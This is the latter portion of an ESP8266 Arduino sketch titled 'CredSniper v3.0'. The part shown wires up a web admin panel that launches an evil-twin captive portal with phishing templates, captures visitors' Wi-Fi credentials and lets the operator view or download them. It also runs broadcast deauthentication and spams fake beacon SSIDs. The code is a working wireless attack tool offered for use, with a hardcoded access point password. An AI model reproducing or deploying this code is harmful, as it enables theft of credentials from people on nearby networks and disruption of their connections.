  page += "<form method='get' action='/view-credentials' style='flex:1;'>";
  page += "<button class='btn-action btn-use' style='width:100%;'>👁️ View Logs</button>";
  page += "</form>";
  page += "</div>";
  page += "</div>";
  
  page += "</div>";
  
  // JavaScript
  page += "<script>";
  page += "document.getElementById('fileInput').addEventListener('change', function() {";
  page += "  if (this.files.length > 0) {";
  page += "    document.getElementById('uploadForm').submit();";
  page += "  }";
  page += "});";
  
  page += "// Auto refresh every 30 seconds only if no recent actions";
  page += "if (!window.location.href.includes('?use-file=') && !window.location.href.includes('?delete-file=')) {";
  page += "  setTimeout(function(){ location.reload(); }, 30000);";
  page += "}";
  page += "</script>";
  
  page += "</body></html>";
  
  webServer.send(200, "text/html", page);
}

// ========== ROUTE HANDLERS ==========
void handleRoot() {
  if (hotspotActive) {
    webServer.send(200, "text/html", getTemplateHTML());
    return;
  }
  
  if (webServer.hasArg("scan")) {
    performScan();
  }
  
  if (webServer.hasArg("clear-selection")) {
    selectedNetwork.ssid = "";
    Serial.println("[+] Selection cleared");
  }
  
  if (webServer.hasArg("ap")) {
    int index = webServer.arg("ap").toInt();
    if (index >= 0 && index < MAX_NETWORKS && networks[index].ssid != "" && networks[index].inRange) {
      selectedNetwork = networks[index];
      Serial.println("\n[+] Selected: " + selectedNetwork.ssid);
      Serial.println("[+] BSSID: " + formatBSSID(selectedNetwork.bssid));
    }
  }
  
  if (webServer.hasArg("template")) {
    currentTemplate = webServer.arg("template");
    Serial.println("[+] Template changed to: " + currentTemplate);
  }
  
  if (webServer.hasArg("use-file")) {
    String filename = webServer.arg("use-file");
    currentTemplate = filename;
    uploadStatus = "✅ Now using template: " + filename;
    Serial.println("[+] Using custom template: " + filename);
    invalidateFileCache();
  }
  
  if (webServer.hasArg("delete-file")) {
    String filename = webServer.arg("delete-file");
    handleDeleteFile(filename);
    uploadStatus = "🗑️ Deleted template: " + filename;
  }
  
  if (webServer.hasArg("attack")) {
    String attack = webServer.arg("attack");
    
    if (attack == "eviltwin") {
      startEvilTwin();
    }
    else if (attack == "stop") {
      returnToAdminAP();
    }
  }
  
  if (webServer.hasArg("deauth")) {
    String action = webServer.arg("deauth");
    if (action == "start") {
      deauthing_active = true;
      Serial.println("[+] Deauth started (broadcast)");
    } else if (action == "stop") {
      deauthing_active = false;
      Serial.println("[+] Deauth stopped");
    }
  }
  
  if (webServer.hasArg("beacon")) {
    String action = webServer.arg("beacon");
    if (action == "start") {
      beaconSpamActive = true;
      Serial.println("\n[+] 🎵 Starting PROVEN Beacon Spam Attack!");
      Serial.println("[+] Using Spacehuhn's tested method");
      Serial.println("[+] Spamming 70+ One Direction song SSIDs");
      Serial.println("[+] Channels: 1, 6, 11 (rotating)");
      Serial.println("[+] Speed: ~70 fake networks/second");
    } else if (action == "stop") {
      beaconSpamActive = false;
      Serial.println("[+] Beacon Spam stopped");
      Serial.println("[+] Total packets: " + String(beaconPacketCounter));
      beaconPacketCounter = 0;
    }
  }
  
  if (webServer.hasArg("delete-credentials")) {
    deleteCredentialsFile();
    uploadStatus = "🗑️ Deleted all credentials";
  }
  
  showAdminPanel();
}

void handleNotFound() {
  if (hotspotActive) {
    webServer.send(200, "text/html", getTemplateHTML());
  } else {
    showAdminPanel();
  }
}

// ========== SETUP ==========
void setup() {
  Serial.begin(115200);
  delay(1000);
  
  Serial.println("\n\n==================================");
  Serial.println("       🎯 CredSniper v3.0");
  Serial.println("  🎵 One Direction Beacon Spam");
  Serial.println("==================================\n");
  
  // Initialize SPIFFS
  if (!SPIFFS.begin()) {
    Serial.println("❌ SPIFFS Mount Failed!");
  } else {
    Serial.println("✅ SPIFFS Mounted");
  }
  
  // Save all templates to SPIFFS
  saveTemplatesToSPIFFS();
  
  // Initialize beacon spam
  for (int i = 0; i < 32; i++)
    emptySSID[i] = ' ';
  
  randomSeed(os_random());
  packetSize = sizeof(beaconPacket);
  if (wpa2) {
    beaconPacket[34] = 0x31;
  } else {
    beaconPacket[34] = 0x21;
    packetSize -= 26;
  }
  
  randomMac();
  
  // WiFi setup
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, subnet);
  WiFi.softAP("CredSniper", "dewdew5218");
  dnsServer.start(DNS_PORT, "*", apIP);
  
  // Set initial WiFi channel
  wifi_set_channel(channels[0]);

  // Web server routes
  webServer.on("/", handleRoot);
  webServer.on("/capture", handleCapture);
  webServer.on("/download-credentials", handleDownloadCredentials);
  webServer.on("/view-credentials", handleViewCredentials);
  
  // Upload handler
  webServer.on("/upload", HTTP_POST, []() {
    webServer.send(200, "text/html", "<script>window.location.href='/'</script>");
  }, handleFileUpload);
  
  webServer.onNotFound(handleNotFound);
  
  webServer.begin();
  
  // Pre-cache file list on startup
  getFileListHTML();
  getUploadedFileCount();
  
  performScan();
  
  Serial.println("\n✅ System Ready!");
  Serial.println("📶 AP: CredSniper");
  Serial.println("🔐 Pass: dewdew5218");
  Serial.println("🌐 IP: 192.168.4.1");
  Serial.println("🎵 Beacon Spam: PROVEN Spacehuhn method");
  Serial.println("🎵 SSIDs: 70+ One Direction songs");
  Serial.println("📁 File list caching enabled (30s)");
  Serial.println("📊 Network table layout FIXED - No more cutting");
  Serial.println("✅ File list availability FIXED");
  Serial.println("==================================\n");
}

// ========== MAIN LOOP ==========
void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  
  performDeauth();
  performProvenBeaconSpam();
  
  if (!hotspotActive && !beaconSpamActive && millis() - lastScan >= 30000) {
    performScan();
    lastScan = millis();
  }
  
  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("WiFi Status: Disconnected");
    }
    wifinow = millis();
  }
  
  delay(10);
}
